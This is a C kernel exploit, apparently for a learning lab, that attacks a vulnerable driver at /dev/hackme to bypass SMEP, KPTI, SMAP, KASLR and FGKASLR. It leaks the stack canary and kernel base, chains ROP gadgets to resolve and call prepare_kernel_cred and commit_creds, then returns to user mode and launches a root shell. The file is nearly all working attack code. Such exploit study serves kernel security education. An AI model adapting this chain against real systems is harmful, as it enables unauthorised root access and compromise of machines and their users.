/*

Exploit Title: sploit4.c
Author: wetw0rk
Link: https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/

Description: Kernel exploit bypassing SMEP, KPTI, SMAP, KASLR and FGKASLR

Compile: gcc sploit4.c -o initramfs/exploit -static

*/

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

              int global_fd;

unsigned long int ksymtab_prepare_kernel_cred;
unsigned long int ksymtab_commit_creds;

unsigned long int commit_creds;
unsigned long int prepare_kernel_cred;

unsigned long int creds_struct;

unsigned long int cookie;
unsigned long int image_base;
unsigned long int tmp_var;

unsigned long int user_cs;
unsigned long int user_ss;
unsigned long int user_rflags;
unsigned long int user_sp;

void get_commit_creds();
void get_prepare_kernel_cred();
void call_prepare_kernel_cred();
void get_shell();

void
stage4(void)
{
  unsigned long int payload[50];
  unsigned long int offset = 16;

  payload[offset++] = cookie;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = image_base + 0x6370; // pop rdi ; ret (return addres)
  payload[offset++] = creds_struct;  // rdi <- argv1 (creds_struct)
  payload[offset++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
  payload[offset++] = image_base+0x200f26; // swapgs_restore_regs_and_return_to_usermode+22 (kpti_trampoline)
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = (unsigned long int)get_shell;
  payload[offset++] = user_cs;
  payload[offset++] = user_rflags;
  payload[offset++] = user_sp;
  payload[offset++] = user_ss;

  printf("[*] Preparing payload to call commit_creds\n");
  write(global_fd,
        payload,
        sizeof(payload));
}

void get_shell(void)
{
  printf("[*] Brutal but we made it back\n");
  if (getuid() == 0) {
    printf("[+] UID: %d, got root!", getuid());
    system("/bin/sh");
  }
}

void
stage3(void)
{
  unsigned long int payload[50];
  unsigned long int offset = 16;

  payload[offset++] = cookie;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = image_base + 0x6370; // pop rdi ; ret (return addres)
  payload[offset++] = 0x0000000000000000;  // rdi <- argv1 (0)
  payload[offset++] = prepare_kernel_cred; // prepare_kernel_cred(0)
  payload[offset++] = image_base+0x200f26; // swapgs_restore_regs_and_return_to_usermode+22 (kpti_trampoline)
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = (unsigned long int)call_prepare_kernel_cred;
  payload[offset++] = user_cs;
  payload[offset++] = user_rflags;
  payload[offset++] = user_sp;
  payload[offset++] = user_ss;

  printf("[*] Preparing payload to call prepare_kernel_cred(0)\n");
  write(global_fd,
        payload,
        sizeof(payload));
}

void
call_prepare_kernel_cred(void)
{
  __asm__(
    ".intel_syntax noprefix;"
    "mov tmp_var, rax;"
    ".att_syntax;"
  );
  creds_struct = tmp_var;
  printf("[*] returned creds struct: 0x%lx\n", creds_struct);
  stage4();
}

void
stage2(void)
{
  unsigned long int payload[50];
  unsigned long     offset = 16;

  payload[offset++] = cookie;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = image_base + 0x4d11;         // pop rax ; ret (return addres)
  payload[offset++] = ksymtab_prepare_kernel_cred - 0x10; // __ksymtab_prepare_kernel_cred
  payload[offset++] = image_base + 0x4aae;         // mov eax, dword ptr [rax + 0x10] ; pop rbp ; ret
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = image_base+0x200f26;         // swapgs_restore_regs_and_return_to_usermode+22 (kpti_trampoline)
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = (unsigned long int)get_prepare_kernel_cred;
  payload[offset++] = user_cs;
  payload[offset++] = user_rflags;
  payload[offset++] = user_sp;
  payload[offset++] = user_ss;

  write(global_fd,
        payload,
        sizeof(payload));
}

void get_prepare_kernel_cred(void)
{
  __asm__(
    ".intel_syntax noprefix;"
    "mov tmp_var, rax;"
    ".att_syntax;"
  );
  prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_var;
  printf("[*] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
  stage3();
}

void
stage1(void)
{
  unsigned long int payload[50];
  unsigned          offset = 16;

  payload[offset++] = cookie;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = image_base + 0x4d11;         // pop rax ; ret (return addres)
  payload[offset++] = ksymtab_commit_creds - 0x10; // __ksymtab_commit_creds
  payload[offset++] = image_base + 0x4aae;         // mov eax, dword ptr [rax + 0x10] ; pop rbp ; ret
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = image_base+0x200f26;         // swapgs_restore_regs_and_return_to_usermode+22 (kpti_trampoline)
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = 0x0000000000000000;
  payload[offset++] = (unsigned long int)get_commit_creds;
  payload[offset++] = user_cs;
  payload[offset++] = user_rflags;
  payload[offset++] = user_sp;
  payload[offset++] = user_ss;

  write(global_fd,
        payload,
        sizeof(payload));
}

void
get_commit_creds(void)
{
  __asm__(
    ".intel_syntax noprefix;"
    "mov tmp_var, rax;"
    ".att_syntax;"
  );
  commit_creds = ksymtab_commit_creds + (int)tmp_var;
  printf("[*] commit_creds: 0x%lx\n", commit_creds);
  stage2();
}

void
leak_stack(void)
{
  unsigned long int leak[50];
  ssize_t           r;

  r = read(global_fd,     // File descriptor to read from
           leak,          // buffer to recieve data
	   sizeof(leak));
  
  printf("[*] successfully leaked %zd bytes\n", r);

  cookie = leak[16];
  image_base = leak[38]-0xa157;
  ksymtab_commit_creds = image_base + 0xf87d90;
  ksymtab_prepare_kernel_cred = image_base + 0xf8d4fc;
  printf("[*] stack canary: 0x%lx\n", cookie);
  printf("[*] image base: 0x%lx\n", image_base);
  printf("[*] __ksymtab_commit_creds: 0x%lx\n", ksymtab_commit_creds);
  printf("[*] __ksymtab_prepare_kernel_cred: 0x%lx\n", ksymtab_prepare_kernel_cred);
}

void
open_device(void)
{
  global_fd = open("/dev/hackme", O_RDWR);
  if (global_fd < 0) {
    printf("[-] Failed to open device\n");
    exit(-1);
  }
}

void
save_state(void)
{
  printf("[*] Preparing round trip to the kernel\n");
  __asm__(
  ".intel_syntax noprefix;"
  "mov user_cs, cs;"  // user_cs = cs
  "mov user_ss, ss;"  // user_ss = ss
  "mov user_sp, rsp;" // user_sp = current location of stack pointer
  "pushf;"            // push flags onto stack
  "pop user_rflags;"  // store RFLAGS into user_rflags
  ".att_syntax;"
  );
}

int
main()
{
  save_state();
  open_device();
  leak_stack();
  stage1();
}
